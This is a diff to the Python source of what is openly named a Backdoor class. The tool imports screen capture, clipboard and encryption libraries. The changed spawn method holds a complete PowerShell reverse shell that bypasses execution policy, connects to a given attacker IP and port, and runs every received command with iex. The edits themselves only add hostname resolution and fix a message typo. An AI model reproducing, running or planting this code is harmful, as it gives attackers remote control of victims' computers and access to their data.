@@ -2,7 +2,6 @@
 import subprocess, socket, json, os, base64, shutil, sys, platform, ctypes,pyperclip
 from mss import mss
 from Crypto.Cipher import AES
-
 global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
 
 counter = "H"*16
@@ -184,10 +183,11 @@ class Backdoor:
             pass
 
     def spawn(self,target_ip,target_port):
+    	target_ip = socket.gethostbyname(target_ip)
         spawner=""" powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
         try:
             subprocess.Popen(spawner,shell=True)
-            return "[+] powershell session spawn successfully check your listener [+]"
+            return "[+] powershell session spawned successfully check your listener [+]"
         except :
             return "[-] failed to spawn powershell session [-]"
 
